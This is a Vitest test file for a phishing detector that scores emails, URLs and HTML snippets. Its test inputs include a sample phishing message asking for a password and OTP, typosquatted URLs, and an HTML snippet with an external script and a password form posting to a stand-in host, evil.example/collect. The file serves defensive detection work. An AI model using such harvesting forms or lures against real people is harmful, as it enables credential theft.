import { describe, expect, it } from "vitest";
import { analyzeEmail, analyzeHtml, analyzeUrl, classify } from "./analyzer";

describe("risk classification", () => {
  it("uses the documented boundaries", () => {
    expect(classify(0)).toBe("Low Risk"); expect(classify(29)).toBe("Low Risk");
    expect(classify(30)).toBe("Suspicious"); expect(classify(59)).toBe("Suspicious");
    expect(classify(60)).toBe("High Risk"); expect(classify(100)).toBe("High Risk");
  });
});

describe("email analysis", () => {
  it("keeps a normal university announcement low risk", () => {
    const r = analyzeEmail({ message: "Hello students, the library closes at 6 pm on Friday for scheduled maintenance. No action is required." });
    expect(r.score).toBeLessThan(30); expect(r.classification).toBe("Low Risk");
  });
  it("scores a credential phishing message highly and explains why", () => {
    const r = analyzeEmail({ message: "Urgent! Your account will be suspended. Verify your account now and send your password and OTP. https://campus-login.example.com" });
    expect(r.score).toBeGreaterThanOrEqual(60); expect(r.indicators.map(x => x.title)).toContain("Credential or code request");
  });
  it("flags sender/display-name mismatch", () => {
    const r = analyzeEmail({ message: "Please review this notice.", sender: "campus@gmail.com", displayName: "University IT" });
    expect(r.indicators.map(x => x.title)).toContain("Sender and display name mismatch");
  });
  it("extracts a sender header from a pasted sample for mismatch analysis", () => {
    const r = analyzeEmail({ message: "From: IT Helpdesk <campus.support@gmail.com>\n\nPlease sign in." });
    expect(r.indicators.map(x => x.title)).toContain("Sender and display name mismatch");
  });
  it("handles empty and very long messages at the UI validation boundary", () => {
    expect(analyzeEmail({ message: "" }).score).toBe(0);
    expect(analyzeEmail({ message: "x".repeat(20001) }).score).toBe(0);
  });
});

describe("URL analysis", () => {
  it("accepts a normal HTTPS URL without heuristic alerts", () => {
    const r = analyzeUrl("https://www.wikipedia.org/");
    expect(r.classification).toBe("Low Risk"); expect(r.domain).toBe("www.wikipedia.org");
  });
  it("flags shortened and misspelled brand URLs", () => {
    expect(analyzeUrl("https://bit.ly/example").indicators.map(x => x.title)).toContain("URL shortener");
    expect(analyzeUrl("https://paypa1.com").indicators.map(x => x.title)).toContain("Possible misspelled brand domain");
    expect(analyzeUrl("https://paypal.com.attacker.example").indicators.map(x => x.title)).toContain("Brand appears only in a subdomain");
  });
  it("flags IP hosts, Unicode and unencrypted HTTP", () => {
    expect(analyzeUrl("http://192.168.1.1/login").score).toBeGreaterThanOrEqual(30);
    expect(analyzeUrl("https://раypal.com").indicators.map(x => x.title)).toContain("Internationalized domain name");
    expect(analyzeUrl("http://example.com").indicators.map(x => x.title)).toContain("No HTTPS transport");
  });
  it("handles invalid, empty and oversized inputs", () => {
    expect(analyzeUrl("").urlError).toBeTruthy(); expect(analyzeUrl("http://").urlError).toBeTruthy();
    expect(analyzeUrl("x".repeat(2049)).urlError).toMatch(/2,048/);
  });
  it("does not treat HTTPS alone as safety proof", () => {
    expect(analyzeUrl("https://bit.ly/x").recommendations.join(" ")).toMatch(/padlock or HTTPS/);
  });
});

describe("HTML snippet analysis", () => {
  it("flags password forms and external scripts without executing them", () => {
    const r = analyzeHtml('<script src="https://evil.example/a.js"></script><form action="https://evil.example/collect"><input type="password"></form>');
    expect(r.indicators.map(x => x.title)).toContain("Credential collection form");
    expect(r.indicators.map(x => x.title)).toContain("External script included");
    expect(r.recommendations.join(" ")).toContain("never rendered or executed");
  });
  it("limits the snippet size", () => { expect(analyzeHtml("x".repeat(50001)).indicators[0].title).toBe("Snippet too long"); });
});
